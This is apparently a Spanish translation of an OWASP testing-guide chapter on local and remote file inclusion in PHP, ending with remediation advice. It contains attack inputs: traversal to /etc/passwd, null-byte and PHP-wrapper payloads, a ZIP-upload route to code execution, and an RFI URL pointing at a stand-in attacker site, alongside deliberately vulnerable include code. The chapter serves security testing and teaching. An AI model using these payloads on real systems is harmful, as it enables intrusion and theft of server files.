# Inclusión de archivos

## Resumen

La vulnerabilidad de inclusión de archivos permite a un atacante incluir un archivo, generalmente explotando un mecanismo de «inclusión dinámica de archivos» implementado en la aplicación objetivo. La vulnerabilidad se produce por el uso de entradas proporcionadas por el usuario sin una validación adecuada.

Esto puede tener como resultado algo tan simple como mostrar el contenido del archivo, pero también puede provocar:

- Ejecución de código en el servidor web
- Ejecución de código en el lado del cliente, como JavaScript, que puede dar lugar a otros ataques, como el scripting entre sitios (XSS)
- Denegación de servicio (DoS)
- Divulgación de información confidencial

La inclusión de archivos locales (LFI) es el proceso de incluir archivos que ya están presentes en el servidor mediante la explotación de procedimientos de inclusión vulnerables implementados en la aplicación. Por ejemplo, esta vulnerabilidad se produce cuando una página recibe una entrada que es la ruta a un archivo local. Esta entrada no se depura adecuadamente, lo que permite inyectar caracteres de recorrido de directorios (como `../`; véase 4.5.1 [Pruebas de recorrido de directorios e inclusión de archivos](../05-Authorization/01-Directory_Traversal_File_Include.md)).

La inclusión de archivos remotos (RFI) es el proceso de incluir archivos de fuentes remotas mediante la explotación de procedimientos de inclusión vulnerables implementados en la aplicación. Por ejemplo, esta vulnerabilidad se produce cuando una página recibe una entrada que es la URL de un archivo remoto. Esta entrada no se depura adecuadamente, lo que permite inyectar URLs externas.

En ambos casos, aunque la mayoría de los ejemplos se refieren a scripts PHP vulnerables, debemos tener en cuenta que también es común en otras tecnologías, como JSP, ASP, etc.

## Objetivos de la prueba

- Identificar puntos de inclusión de archivos.
- Evaluar la gravedad o el impacto potencial de las vulnerabilidades.

## Cómo probar

### Inclusión de archivos locales

Dado que LFI se produce cuando las rutas que se pasan a las instrucciones `include` no se depuran adecuadamente, en un enfoque de pruebas de caja negra debemos buscar funcionalidades que acepten nombres o rutas de archivos como parámetros.

Considere el siguiente ejemplo:

`https://vulnerable_host/preview.php?file=example.html`

Este parece ser un lugar prometedor para probar LFI. Si la aplicación no selecciona la página adecuada especificada en el parámetro `file` y, en cambio, incluye directamente la entrada, es posible incluir archivos arbitrarios del servidor.

Una prueba de concepto típica de explotación consistiría en intentar cargar el archivo `passwd` con:

`https://vulnerable_host/preview.php?file=../../../../etc/passwd`

Si se cumplen las condiciones mencionadas anteriormente, un atacante vería algo como lo siguiente incluido en la respuesta:

```bash
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
...
```

Incluso cuando existe una vulnerabilidad de este tipo, su explotación puede ser más compleja en situaciones reales. Considere el siguiente fragmento de código:

```php
<?php include($_GET['file'].".php"); ?>
```

Una sustitución simple por un nombre de archivo aleatorio no funcionaría, ya que se añade el sufijo `.php` a la entrada proporcionada. Para eludirlo, un evaluador puede usar varias técnicas con el fin de lograr la explotación esperada.

#### Inyección de byte nulo

El `carácter nulo` (también conocido como `terminador nulo` o `byte nulo`) es un carácter de control con valor cero, presente en muchos conjuntos de caracteres, que se usa como carácter reservado para marcar el final de una cadena. Una vez utilizado, se ignora cualquier carácter que aparezca después de este byte especial. Una forma habitual de inyectar este carácter consiste en añadir a la ruta solicitada la cadena codificada en URL `%00`. En el ejemplo anterior, al realizar una solicitud a `https://vulnerable_host/preview.php?file=../../../../etc/passwd%00`, se ignoraría la extensión `.php` que se añade al nombre de archivo de entrada y, como resultado de una explotación exitosa, se devolvería al atacante una lista de usuarios básicos.

#### Truncamiento de ruta y punto

La mayoría de las instalaciones de PHP tienen un límite de 4096 bytes para los nombres de archivo. Si un nombre de archivo supera esa longitud, PHP simplemente lo trunca y descarta los caracteres adicionales. El abuso de este comportamiento permite hacer que el motor de PHP ignore la extensión `.php` al desplazarla más allá del límite de 4096 bytes. Cuando esto sucede, no se produce ningún error; los caracteres adicionales simplemente se descartan y PHP continúa su ejecución con normalidad.

Este método de elusión suele combinarse con otras estrategias para eludir la lógica, como codificar parte de la ruta del archivo con Unicode, introducir una doble codificación o usar cualquier otra entrada que siga representando el nombre de archivo válido deseado.

#### Wrappers de PHP

Las vulnerabilidades de inclusión de archivos locales suelen considerarse vulnerabilidades de solo lectura que un atacante puede utilizar para leer datos confidenciales del servidor que aloja la aplicación vulnerable. Sin embargo, en algunas implementaciones específicas, esta vulnerabilidad puede utilizarse para elevar el ataque [de LFI a ejecución remota de código](https://corben.io/blog/17-01-01-zip-to-rce-lfi), lo que podría permitir comprometer por completo el host.

Esta ampliación del impacto es habitual cuando un atacante puede combinar la [vulnerabilidad LFI con ciertos wrappers de PHP](https://www.invicti.com/blog/web-security/php-stream-wrappers).

Un wrapper es código que envuelve otro código para añadirle alguna funcionalidad. PHP implementa muchos [wrappers integrados](https://www.php.net/manual/en/wrappers.php) para usarlos con funciones del sistema de archivos. Una vez detectado su uso durante las pruebas de una aplicación, es recomendable intentar aprovecharlo para identificar el riesgo real de la(s) debilidad(es) detectada(s). A continuación se presenta una lista de los wrappers más utilizados. Tenga en cuenta que no es exhaustiva y que también es posible registrar wrappers personalizados; si el objetivo los utiliza, será necesario realizar un análisis ad hoc más profundo.

##### PHP Filter

Se utiliza para acceder al sistema de archivos local. Este wrapper, que no distingue entre mayúsculas y minúsculas, permite aplicar filtros a un flujo en el momento de abrir un archivo. Puede utilizarse para obtener el contenido de un archivo e impedir que el servidor lo ejecute. Por ejemplo, permite a un atacante leer el contenido de archivos PHP para obtener el código fuente e identificar información confidencial, como credenciales u otras vulnerabilidades explotables.

El wrapper se puede usar como `php://filter/convert.base64-encode/resource=FILE`, donde `FILE` es el archivo que se recuperará. Al ejecutar esta operación, se leería el contenido del archivo objetivo, se codificaría en base64 (este paso impide la ejecución en el servidor) y se devolvería al agente de usuario.

##### PHP ZIP

En PHP 7.2.0 se introdujo el wrapper `zip://` para manipular archivos comprimidos `zip`. Este wrapper espera la siguiente estructura de parámetros: `zip:///filename_path#internal_filename`. `filename_path` es la ruta al archivo ZIP malicioso e `internal_filename` es la ruta del archivo malicioso ubicado dentro del archivo ZIP procesado. Durante la explotación, es habitual codificar `#` con su valor codificado en URL, `%23`.

El abuso de este wrapper podría permitir a un atacante crear un archivo ZIP malicioso que se subiría al servidor, por ejemplo, como imagen de avatar o mediante cualquier sistema de subida de archivos disponible en el sitio objetivo (el wrapper `php:zip://` no requiere que el archivo ZIP tenga una extensión específica), para que la vulnerabilidad LFI lo ejecute.

Para probar esta vulnerabilidad, se puede seguir el procedimiento siguiente para atacar el ejemplo de código anterior.

1. Cree el archivo PHP que se ejecutará, por ejemplo, con el contenido `<?php phpinfo(); ?>`, y guárdelo como `code.php`.
2. Comprímalo en un nuevo archivo ZIP llamado `target.zip`.
3. Cambie el nombre del archivo `target.zip` a `target.jpg` para eludir la validación de la extensión y súbalo al sitio web objetivo como imagen de avatar.
4. Suponiendo que el archivo `target.jpg` se almacena localmente en el servidor en la ruta `../avatar/target.jpg`, explote la vulnerabilidad con el wrapper PHP ZIP inyectando la siguiente carga útil en la URL vulnerable: `zip://../avatar/target.jpg%23code` (recuerde que `%23` corresponde a `#`).

Como en nuestro ejemplo la extensión `.php` se concatena a la carga útil, la solicitud a `https://vulnerable_host/preview.php?file=zip://../avatar/target.jpg%23code` provocará la ejecución del archivo `code.php` presente en el archivo ZIP malicioso.

##### PHP Data

Disponible desde PHP 5.2.0, este wrapper espera el siguiente formato: `data://text/plain;base64,BASE64_STR`, donde se espera que `BASE64_STR` sea el contenido del archivo que se va a procesar, codificado en base64. Es importante tener en cuenta que este wrapper solo estará disponible si la opción `allow_url_include` está habilitada.

Para probar LFI con este wrapper, el código que se ejecutará debe codificarse en base64. Por ejemplo, `<?php phpinfo(); ?>` se codificaría como `PD9waHAgcGhwaW5mbygpOyA/Pg==` y la carga útil tendría el formato `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`.

##### PHP Expect

Este wrapper, que no está habilitado de forma predeterminada, proporciona acceso a los flujos de entrada y salida de los procesos: `stdio`, `stdout` y `stderr`. Con el formato `expect://command`, el servidor ejecutaría el comando proporcionado mediante `BASH` y devolvería el resultado.

### Inclusión de archivos remotos

Dado que RFI se produce cuando las URLs que se pasan a las instrucciones `include` no se depuran adecuadamente, en un enfoque de pruebas de caja negra debemos buscar scripts que acepten nombres de archivo como parámetros. Considere el siguiente ejemplo de PHP:

```php
$incfile = $_REQUEST["file"];
include($incfile.".php");
```

En este ejemplo, la ruta se extrae de la solicitud HTTP y no se valida la entrada (por ejemplo, comprobándola con una lista de permitidos), por lo que este fragmento de código es vulnerable a este tipo de ataque. Considere la siguiente URL:

`https://vulnerable_host/vuln_page.php?file=https://attacker_site/malicous_page`

En este caso, se incluirá el archivo remoto y el servidor ejecutará cualquier código que contenga.

## Remediación

La solución más eficaz para eliminar las vulnerabilidades de inclusión de archivos es evitar pasar entradas proporcionadas por el usuario a cualquier API del sistema de archivos o del framework. Si esto no es posible, la aplicación puede mantener una lista de permitidos de los archivos que la página puede incluir y luego usar un identificador (por ejemplo, el número de índice) para acceder al archivo seleccionado. Toda solicitud que contenga un identificador no válido debe rechazarse para impedir que usuarios maliciosos manipulen la ruta.
Consulte la [Hoja de referencia de subida de archivos](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) para conocer buenas prácticas de seguridad sobre este tema.
